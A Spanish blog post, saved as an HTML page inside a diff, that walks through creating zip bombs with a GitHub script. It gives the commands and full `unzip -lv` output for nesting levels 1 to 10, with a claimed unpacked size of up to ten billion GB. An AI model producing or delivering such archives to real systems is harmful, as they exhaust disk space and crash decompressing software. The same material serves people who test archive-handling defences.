@@ -1,0 +1,220 @@
+<!DOCTYPE html><html class="no-js" lang="es-ES"><head><meta http-equiv="content-type" content="text/html" charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" ><link rel="profile" href="http://gmpg.org/xfn/11"><link type="text/css" media="all" href="https://mierda.tv/wp-contenido/cache/autoptimize/css/autoptimize_dcbc99a7d03052a28dbf604173960da0.css" rel="stylesheet" /><title>Crear una bomba zip y comprobar el ratio de compresión &#8211; [ MIERDA TV ]</title><link rel="alternate" type="application/rss+xml" title="[ MIERDA TV ] &raquo; Feed" href="https://mierda.tv/feed/" /><link rel="alternate" type="application/rss+xml" title="[ MIERDA TV ] &raquo; RSS de los comentarios" href="https://mierda.tv/comments/feed/" /><link rel="alternate" type="application/rss+xml" title="[ MIERDA TV ] &raquo; Crear una bomba zip y comprobar el ratio de compresión RSS de los comentarios" href="https://mierda.tv/2018/08/01/crear-una-bomba-zip-y-comprobar-el-ratio-de-compresion/feed/" /><link rel='stylesheet' id='mcluhan-fonts-css'  href='https://fonts.googleapis.com/css?family=Archivo:400,400i,600,600i,700,700i&#038;subset=latin-ext' type='text/css' media='all' /> <script type='text/javascript' src='https://mierda.tv/wp-includes/js/jquery/jquery.js'></script> <link rel='https://api.w.org/' href='https://mierda.tv/wp-json/' /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://mierda.tv/xmlrpc.php?rsd" /><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://mierda.tv/wp-includes/wlwmanifest.xml" /><link rel='prev' title='Bios de miles de maquinas y Kaillera server mame en GNU/Linux' href='https://mierda.tv/2018/07/31/bios-de-miles-de-maquinas-y-kaillera-server-mame-en-gnu-linux/' /><link rel='next' title='Problemas absurdos que le ocurren a mi pareja en el mundo del software libre' href='https://mierda.tv/2018/08/02/problemas-absurdos-que-le-ocurren-a-mi-pareja-en-el-mundo-del-software-libre/' /><meta name="generator" content="WordPress 4.9.8" /><link rel="canonical" href="https://mierda.tv/2018/08/01/crear-una-bomba-zip-y-comprobar-el-ratio-de-compresion/" /><link rel='shortlink' href='https://mierda.tv/?p=10575' /><link rel="alternate" type="application/json+oembed" href="https://mierda.tv/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmierda.tv%2F2018%2F08%2F01%2Fcrear-una-bomba-zip-y-comprobar-el-ratio-de-compresion%2F" /> <script>jQuery( 'html' ).removeClass( 'no-js' ).addClass( 'js' );</script> <link rel="icon" href="https://mierda.tv/wp-contenido/uploads/2017/12/favicon-1.png" type="image/png"/><link rel="shortcut icon" href="https://mierda.tv/wp-contenido/uploads/2017/12/favicon.png" /></head><body class="post-template-default single single-post postid-10575 single-format-standard"><header class="site-header group"><h1 class="site-title"><a href="https://mierda.tv" class="site-name">[ MIERDA TV ]</a></h1><p class="site-description">NSFW Fanta text files</p><div class="nav-toggle"><div class="bar"></div><div class="bar"></div></div><div class="menu-wrapper"><ul class="main-menu desktop"><li id="menu-item-9007" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-9007"><a href="https://mierda.tv/category/sistemas/"># SYSTEM</a></li><li id="menu-item-9006" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-9006"><a href="https://mierda.tv/category/codigo/"># CODE</a></li><li id="menu-item-9008" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9008"><a href="https://mierda.tv/category/juegos/"># GAMES</a></li><li id="menu-item-9012" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9012"><a href="https://mierda.tv/category/3d/"># 3D</a></li><li id="menu-item-9011" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9011"><a href="https://mierda.tv/category/musica/"># MUSIC</a></li><li id="menu-item-9010" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9010"><a href="https://mierda.tv/category/opinion/"># VIEW</a></li></ul></div><ul class="social-menu desktop"><li><a href="https://mierda.tv/?s="></a></li><li id="menu-item-10588" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10588"><a title="Suscríbete al Boletín mensual de Mierda.tv" href="https://mierda.tv/suscribete-al-boletin-mensual-de-mierda-tv/"><span class="screen-reader-text">Suscríbete al Boletín mensual de Mierda.tv</span></a></li></ul></header><div class="mobile-menu-wrapper"><ul class="main-menu mobile"><li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-9007"><a href="https://mierda.tv/category/sistemas/"># SYSTEM</a></li><li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-9006"><a href="https://mierda.tv/category/codigo/"># CODE</a></li><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9008"><a href="https://mierda.tv/category/juegos/"># GAMES</a></li><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9012"><a href="https://mierda.tv/category/3d/"># 3D</a></li><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9011"><a href="https://mierda.tv/category/musica/"># MUSIC</a></li><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9010"><a href="https://mierda.tv/category/opinion/"># VIEW</a></li><li class="toggle-mobile-search-wrapper"><a href="#" class="toggle-mobile-search">Buscar</a></li></ul><ul class="social-menu mobile"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10588"><a title="Suscríbete al Boletín mensual de Mierda.tv" href="https://mierda.tv/suscribete-al-boletin-mensual-de-mierda-tv/"><span class="screen-reader-text">Suscríbete al Boletín mensual de Mierda.tv</span></a></li></ul></div><div class="mobile-search"><div class="untoggle-mobile-search"></div><form role="search" method="get" class="search-form" action="https://mierda.tv/"> <label for="search-form-5bab623155b79"> <span class="screen-reader-text">Búsqueda para:</span> </label> <input type="search" id="search-form-5bab623155b79" class="search-field" placeholder="Introduce tu búsqueda" value="" name="s" autocomplete="off" /> </button></form><div class="mobile-results"><div class="results-wrapper"></div></div></div><div class="search-overlay"><form role="search" method="get" class="search-form" action="https://mierda.tv/"> <label for="search-form-5bab623155c11"> <span class="screen-reader-text">Búsqueda para:</span> </label> <input type="search" id="search-form-5bab623155c11" class="search-field" placeholder="Introduce tu búsqueda" value="" name="s" autocomplete="off" /> </button></form></div><main class="site-content"><article class="post-10575 post type-post status-publish format-standard hentry category-codigo category-sistemas tag-bomba-zip tag-crear-bomba-zip tag-ratio-zip tag-zip-bomb missing-thumbnail"><header class="entry-header section-inner"><h1 class="entry-title">Crear una bomba zip y comprobar el ratio de compresión</h2><div class="meta"> <time><a href="https://mierda.tv/2018/08/01/crear-una-bomba-zip-y-comprobar-el-ratio-de-compresion/" title="1 agosto, 2018 5:19 pm">1 agosto, 2018</a></time> <span> En <a href="https://mierda.tv/category/codigo/" rel="category tag"># CODE</a>, <a href="https://mierda.tv/category/sistemas/" rel="category tag"># SYSTEM</a> </span></div></header><div class="entry-content section-inner"><pre>
+$ git clone https://github.com/abdulfatir/ZipBomb
+$ cd ZipBomb/
+$ python zipbomb.py 10 test.zip
+</pre><p>Para <strong>crear la bomba zip</strong> así por ejemplo:</p><pre>
+$ python zipbomb.py 10 test.zip
+</pre><p><strong>El tamaño</strong> comprimido, descomprimido y el ratio de compresión:</p><p>Nivel 1  &#8211; 19.47 KB  &#8211; 10 GB          &#8211; 100%<br /> Nivel 2  &#8211; 6.93 KB   &#8211; 100 GB         &#8211; 97%<br /> Nivel 3  &#8211; 9.01 KB   &#8211; 1000 GB        &#8211; 88%<br /> Nivel 4  &#8211; 11.60 KB  &#8211; 10000 GB       &#8211; 88%<br /> Nivel 5  &#8211; 14.53 KB  &#8211; 100000 GB      &#8211; 88%<br /> Nivel 6  &#8211; 17.24 KB  &#8211; 1000000 GB     &#8211; 89%<br /> Nivel 7  &#8211; 20.68 KB  &#8211; 10000000 GB    &#8211; 89%<br /> Nivel 8  &#8211; 24.23 KB  &#8211; 100000000 GB   &#8211; 89%<br /> Nivel 9  &#8211; 26.96 KB  &#8211; 1000000000 GB  &#8211; 89%<br /> Nivel 10 &#8211; 29.93 KB  &#8211; 10000000000 GB &#8211; 89%</p><p>Para <strong>ver el ratio</strong>:</p><pre>
+$ unzip -lv test.zip 
+</pre><p>Ejemplos:</p><pre>
+$ python zipbomb.py 1 test.zip
+Compressed File Size: 19.47 KB
+Size After Decompression: 10 GB
+Generation Time: 22.87s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-0.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-1.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-2.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-3.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-4.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-5.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-6.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-7.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-8.zip
+ 1043756  Defl:N     1902 100% 2018-08-01 16:56 fb106707  1-9.zip
+--------          -------  ---                            -------
+10437560            19020 100%                            10 files
+</pre><pre>
+$ python zipbomb.py 2 test.zip
+Compressed File Size: 6.93 KB
+Size After Decompression: 100 GB
+Generation Time: 22.46s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-0.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-1.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-2.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-3.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-4.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-5.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-6.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-7.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-8.zip
+   19952  Defl:N      617  97% 2018-08-01 17:00 8430a824  2-9.zip
+--------          -------  ---                            -------
+  199520             6170  97%                            10 files
+</pre><pre>
+$ python zipbomb.py 3 test.zip
+Compressed File Size: 9.01 KB
+Size After Decompression: 1000 GB
+Generation Time: 23.48s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-0.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-1.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-2.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-3.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-4.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-5.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-6.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-7.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-8.zip
+    6962  Defl:N      830  88% 2018-08-01 17:00 6483b738  3-9.zip
+--------          -------  ---                            -------
+   69620             8300  88%                            10 files
+</pre><pre>
+$ python zipbomb.py 4 test.zip
+Compressed File Size: 11.60 KB
+Size After Decompression: 10000 GB
+Generation Time: 22.58s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-0.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-1.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-2.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-3.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-4.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-5.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-6.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-7.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-8.zip
+    9352  Defl:N     1096  88% 2018-08-01 17:02 28199555  4-9.zip
+--------          -------  ---                            -------
+   93520            10960  88%                            10 files
+</pre><pre>
+$ python zipbomb.py 5 test.zip
+Compressed File Size: 14.53 KB
+Size After Decompression: 100000 GB
+Generation Time: 22.18s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-0.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-1.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-2.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-3.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-4.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-5.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-6.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-7.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-8.zip
+   11852  Defl:N     1396  88% 2018-08-01 17:03 52db6d04  5-9.zip
+--------          -------  ---                            -------
+  118520            13960  88%                            10 files
+</pre><pre>
+$ python zipbomb.py 6 test.zip
+Compressed File Size: 17.24 KB
+Size After Decompression: 1000000 GB
+Generation Time: 21.97s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-0.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-1.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-2.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-3.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-4.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-5.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-6.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-7.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-8.zip
+   14492  Defl:N     1673  89% 2018-08-01 17:04 1474ff32  6-9.zip
+--------          -------  ---                            -------
+  144920            16730  89%                            10 files
+</pre><pre>
+$ python zipbomb.py 7 test.zip
+Compressed File Size: 20.68 KB
+Size After Decompression: 10000000 GB
+Generation Time: 22.52s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-0.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-1.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-2.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-3.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-4.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-5.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-6.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-7.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-8.zip
+   17932  Defl:N     2025  89% 2018-08-01 17:06 31cd8aac  7-9.zip
+--------          -------  ---                            -------
+  179320            20250  89%                            10 files
+
+</pre><pre>
+$ python zipbomb.py 8 test.zip
+Compressed File Size: 24.23 KB
+Size After Decompression: 100000000 GB
+Generation Time: 22.56s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-0.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-1.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-2.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-3.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-4.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-5.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-6.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-7.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-8.zip
+   21352  Defl:N     2389  89% 2018-08-01 17:07 ffeb6e9b  8-9.zip
+--------          -------  ---                            -------
+  213520            23890  89%                            10 files
+</pre><pre>
+$ python zipbomb.py 9 test.zip
+Compressed File Size: 26.96 KB
+Size After Decompression: 1000000000 GB
+Generation Time: 22.78s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-0.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-1.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-2.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-3.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-4.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-5.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-6.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-7.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-8.zip
+   24452  Defl:N     2668  89% 2018-08-01 17:08 24d8b14c  9-9.zip
+--------          -------  ---                            -------
+  244520            26680  89%                            10 files
+</pre><pre>
+$ python zipbomb.py 10 test.zip
+Compressed File Size: 29.93 KB
+Size After Decompression: 10000000000 GB
+Generation Time: 22.18s
+$ unzip -lv test.zip 
+Archive:  test.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-0.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-1.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-2.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-3.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-4.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-5.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-6.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-7.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-8.zip
+   27402  Defl:N     2971  89% 2018-08-01 17:09 6a9dec7d  10-9.zip
+--------          -------  ---                            -------
+  274020            29710  89%                            10 files
+</pre><div class='rp4wp-related-posts'><h3>Más mierda posiblemente relacionada</h3><ul><li><div class='rp4wp-related-post-content'> <a href='https://mierda.tv/2018/01/24/zip-of-death-bombas-que-te-llenan-el-disco-duro/'>Zip of Death - Bombas que te llenan el disco duro</a><p>Las bombas zip en realidad pueden crearse en archivos tar.gz , es decir, se llaman&hellip;</p></div></li><li><div class='rp4wp-related-post-content'> <a href='https://mierda.tv/2018/02/28/gnusocial-install-party-virtual-en-mumble-domingo-4-marzo-2018/'>GNUSocial Install Party en mumble - Domingo 4 Marzo 2018</a><p>La idea es dejar documentado el proceso de instalación de un nodo GNUSocial así como&hellip;</p></div></li><li><div class='rp4wp-related-post-content'> <a href='https://mierda.tv/2018/04/15/comeme-el-donut-la-cancion-del-verano-2018/'>Cómeme el donut - La canción del verano 2018</a><p>Jirafa Rey y Lapili con su canción "Cómeme el donut" podrían ser la nueva canción&hellip;</p></div></li></ul></div></div><div class="meta bottom section-inner"><p class="tags"> #<a href="https://mierda.tv/tag/bomba-zip/" rel="tag">bomba zip</a> #<a href="https://mierda.tv/tag/crear-bomba-zip/" rel="tag">crear bomba zip</a> #<a href="https://mierda.tv/tag/ratio-zip/" rel="tag">ratio zip</a> #<a href="https://mierda.tv/tag/zip-bomb/" rel="tag">zip bomb</a></p></div><div class="post-pagination section-inner"><div class="previous-post"> <a href="https://mierda.tv/2018/07/31/bios-de-miles-de-maquinas-y-kaillera-server-mame-en-gnu-linux/" rel="prev"><span>Bios de miles de maquinas y Kaillera server mame en GNU/Linux</span></a></div><div class="next-post"> <a href="https://mierda.tv/2018/08/02/problemas-absurdos-que-le-ocurren-a-mi-pareja-en-el-mundo-del-software-libre/" rel="next"><span>Problemas absurdos que le ocurren a mi pareja en el mundo del software libre</span></a></div></div><div class="section-inner wide"><div id="respond" class="comment-respond"><h3 id="reply-title" class="comment-reply-title">Deja un comentario <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2018/08/01/crear-una-bomba-zip-y-comprobar-el-ratio-de-compresion/#respond" style="display:none;">Cancelar respuesta</a></small></h3><form action="https://mierda.tv/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-form-comment"><label for="comment">Comentario</label><textarea autocomplete="nope"  id="2c85035148"  name="2c85035148"   cols="45" rows="8" maxlength="65525" required="required"></textarea><textarea id="comment" aria-hidden="true" name="comment" autocomplete="nope" style="padding:0;clip:rect(1px, 1px, 1px, 1px);position:absolute !important;white-space:nowrap;height:1px;width:1px;overflow:hidden;" tabindex="-1"></textarea><script type="text/javascript">document.getElementById("comment").setAttribute( "id", "0d5d69f3e602b426a1dd0c07082277c6" );document.getElementById("2c85035148").setAttribute( "id", "comment" );</script></p><p class="comment-form-author"><label for="author">Nombre <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p><p class="comment-form-email"><label for="email">Correo electrónico <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p><p class="comment-form-url"><label for="url">Web</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Publicar comentario" /> <input type='hidden' name='comment_post_ID' value='10575' id='comment_post_ID' /> <input type='hidden' name='comment_parent' id='comment_parent' value='0' /></p></form></div></div></div><footer class="site-footer section-inner"><p class="copyright">&copy; 2018 <a href="https://mierda.tv" class="site-name">[ MIERDA TV ]</a></p></footer></main> <script type="text/javascript">jQuery(document).ready( function() { jQuery.post( "https://mierda.tv/wp-admin/admin-ajax.php", { action : "entry_views", _ajax_nonce : "70537a5d8f", post_id : 10575 } ); } );</script> <script type='text/javascript'>var es_widget_page_notices = {"es_email_notice":"Por favor introduce direcci\u00f3n de correo electr\u00f3nico","es_success_message":"Suscripci\u00f3n correcta.","es_success_notice":"\u00a1Suscripci\u00f3n correcta! Consulta tu bandeja de entrada y confirma tu suscripci\u00f3n. Si no ves el correo en unos minutos, consulta la carpeta spam\/correo no deseado.","es_email_exists":"\u00a1Esa direcci\u00f3n de correo electr\u00f3nico ya existe!","es_error":"Ups. Ha sucedido un error inesperado.","es_invalid_email":"Direcci\u00f3n de correo electr\u00f3nico no v\u00e1lida","es_try_later":"Por favor, int\u00e9ntalo transcurridos unos minutos","es_ajax_url":"https:\/\/mierda.tv\/wp-admin\/admin-ajax.php"};</script> <script type='text/javascript'>var mcluhan_ajaxpagination = {"ajaxurl":"https:\/\/mierda.tv\/wp-admin\/admin-ajax.php","query_vars":"{\"page\":\"\",\"year\":\"2018\",\"monthnum\":\"08\",\"day\":\"01\",\"name\":\"crear-una-bomba-zip-y-comprobar-el-ratio-de-compresion\"}"};</script> <script type="text/javascript" defer src="https://mierda.tv/wp-contenido/cache/autoptimize/js/autoptimize_0f440c40192207511c15447e1fc97710.js"></script></body></html>
